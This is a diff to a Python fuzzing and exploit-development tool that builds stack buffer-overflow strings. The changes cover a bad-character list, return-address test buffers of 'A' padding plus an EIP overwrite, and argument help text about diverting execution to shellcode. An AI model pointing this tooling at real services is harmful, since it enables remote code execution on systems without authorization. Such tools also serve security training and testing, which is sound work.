@@ -94,7 +94,7 @@ class FuzzLib(object):
 		which_chars_to_remove = ""
 		char_string = ""
 		chars_list = [
-			'\x01','\x02','\x03','\x04','\x05','\x06','\x07','\x08','\x09','\x0a','\x0b',
+			'\x00','\x01','\x02','\x03','\x04','\x05','\x06','\x07','\x08','\x09','\x0a','\x0b',
 			'\x0c','\x0d','\x0e','\x0f','\x10','\x11','\x12','\x13','\x14','\x15','\x16',
 			'\x17','\x18','\x19','\x1a','\x1b','\x1c','\x1d','\x1e','\x1f','\x20','\x21',
 			'\x22','\x23','\x24','\x25','\x26','\x27','\x28','\x29','\x2a','\x2b','\x2c',
@@ -144,8 +144,8 @@ class FuzzLib(object):
 		return str(string_buffer)
 
 	@staticmethod
-	def test_return_address(b_size, b_location, return_address):
-		string_buffer = "A" * b_location + return_address + "C" * (b_size - b_location - 4) 
+	def test_return_address(b_location, return_address):
+		string_buffer = "A" * b_location + return_address + "C" * 400 
 
 		return str(string_buffer)
 
@@ -247,7 +247,7 @@ def main():
 			help='''send a list of ALL possible characters in hex (x00 to xff) to check 
 			what characters are bad and let us know what characters to not include in our buffer, 
 			return address or shell code. MUST use the -l argument''')
-	parser.add_argument('-l', dest='single_buff_location', default=0, metavar='<buffer location>',
+	parser.add_argument('-l', dest='single_buff_location', type=int, default=0, metavar='<buffer location>',
 			help='''location of the buffer offset that overwrote the EIP register after using the
 			--rand command to send a buffer. Use the --find-offset argument with the -s and the
 			-e argument.''')
@@ -264,7 +264,7 @@ def main():
 			argument and -l argument''')
 	parser.add_argument('--find-return-addr', dest='find_return_address', action='store_true',
 			help='''find a return address to divert execution to our shellcode. MUST use
-			the -s argument, -l argument and the -a argument''')
+			the -l argument and the -a argument''')
 	parser.add_argument('-a', dest='return_address', type=str, default='None', metavar='<return address>',
 			help='''return address (in hex format e.g "\\x8f\\x35\\x4a\\x5f") to use to 
 			divert execution flow back to our shellcode. As an example, the Immunity debugger 
@@ -359,7 +359,7 @@ def main():
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
 			else:
-				result = fuzz_l.test_return_address(args.buffer_size, args.single_buff_location, args.return_address)
+				result = fuzz_l.test_return_address(args.single_buff_location, args.return_address)
 				send_buffer(conn, args.buffer_to_fuzz, result)		
 
 		elif args.send_exploit:
